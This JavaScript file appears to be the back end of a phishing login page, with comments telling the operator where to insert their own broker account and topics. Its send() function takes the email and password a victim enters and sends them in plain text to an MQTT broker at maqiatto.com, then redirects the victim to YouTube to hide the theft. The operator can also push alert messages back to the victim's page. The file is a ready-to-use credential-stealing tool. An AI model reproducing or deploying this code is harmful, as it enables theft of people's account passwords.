//IMPORTANT: Replace the email, password, and topics with your data only in the lines of code that are requested.

//Sent Data
function send() {
  var validate = /^[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/;
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;
  if(validate.test(document.getElementById("email").value) == true & password != 0 ){
    message = new Paho.MQTT.Message("email:"+email+" password:"+password);
    //----------------------------------------------------------------------------------------------------------
    //IMPORTANT: Replace email and topic1 with your data
    message.destinationName = "email/topic1";
    //----------------------------------------------------------------------------------------------------------
    client.send(message);
    window.open("https://www.youtube.com", "_self");
  }else{
    alert("Incorrect Email or Password")
    document.getElementById("f1").reset();
  }
}
//Create a client instance
client = new Paho.MQTT.Client("maqiatto.com", 8883, "web_" + parseInt(Math.random() * 100, 10));
//Set callback handlers
client.onConnectionLost = onConnectionLost;
client.onMessageArrived = onMessageArrived;
var options = {
  useSSL: false,
  //----------------------------------------------------------------------------------------------------------
  //IMPORTANT: Replace email and password with your data
  userName: "email",
  password: "password",
  //----------------------------------------------------------------------------------------------------------
  onSuccess:onConnect,
  onFailure:doFail
}
//Connect the client
client.connect(options);
//Called when the client connects
function onConnect() {
  // Once a connection has been made, make a subscription and send a message.
  console.log("Successful Connection");
  //----------------------------------------------------------------------------------------------------------
  //IMPORTANT: Replace email and topic2 with your data
  client.subscribe("email/topic2");
  //----------------------------------------------------------------------------------------------------------
  message = new Paho.MQTT.Message("New Connection");
  //----------------------------------------------------------------------------------------------------------
  //IMPORTANT: Replace email and topic1 with your data
  message.destinationName = "email/topic1";
  //----------------------------------------------------------------------------------------------------------
  client.send(message);
}
function doFail(e){
  console.log(e);
  document.getElementById("t2").innerHTML="Not Available";
  document.getElementById("f1").remove();
}
//Called when the client loses its connection
function onConnectionLost(responseObject) {
  if (responseObject.errorCode != 0) {
    console.log("Connection Lost:"+responseObject.errorMessage);
    document.getElementById("t2").innerHTML="Not Available";
    document.getElementById("f1").remove();
  }
}
//Called when a message arrives
function onMessageArrived(message) {
  console.log("New data received: "+message.payloadString);
  alert(message.payloadString);
}